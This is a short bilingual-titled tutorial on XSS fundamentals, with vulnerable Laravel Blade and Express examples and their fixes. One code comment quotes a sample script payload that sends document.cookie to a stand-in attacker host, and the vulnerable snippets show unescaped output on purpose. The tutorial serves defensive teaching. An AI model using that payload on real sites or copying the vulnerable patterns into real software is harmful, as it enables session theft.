# XSS Fundamentals / Fundamental XSS

## English

Cross-Site Scripting (XSS) occurs when an application includes untrusted data in web pages without proper escaping. Attackers can inject scripts that steal sessions, redirect users, or deface your site.

### Types of XSS

1. **Reflected XSS** — Malicious script comes from the current HTTP request
2. **Stored XSS** — Malicious script is stored in the database and served to other users
3. **DOM-based XSS** — The vulnerability exists in client-side JavaScript

### Vulnerable Code Examples

```php
// VULNERABLE — Laravel Blade with unescaped output
{!! $user->bio !!}
// If bio contains: <script>document.location='https://evil.com/steal?c='+document.cookie</script>
```

```javascript
// VULNERABLE — Express with direct HTML insertion
app.get('/search', (req, res) => {
  res.send(`<h1>Results for: ${req.query.q}</h1>`);
});
```

### How to Fix It

```php
// SAFE — Laravel Blade auto-escapes with double braces
{{ $user->bio }}

// SAFE — Explicit escaping
{!! e($user->bio) !!}
```

```javascript
// SAFE — Use a template engine that auto-escapes (EJS, Handlebars)
// Or sanitize with a library
import DOMPurify from 'dompurify';
const clean = DOMPurify.sanitize(userInput);

// SAFE — Set Content-Security-Policy headers
app.use((req, res, next) => {
  res.setHeader('Content-Security-Policy', "default-src 'self'");
  next();
});
```

### Key Takeaways

- Always escape output — use `{{ }}` in Blade, not `{!! !!}`
- Implement Content-Security-Policy headers
- Use libraries like DOMPurify for HTML sanitization
- Never trust user input, even from authenticated users

---

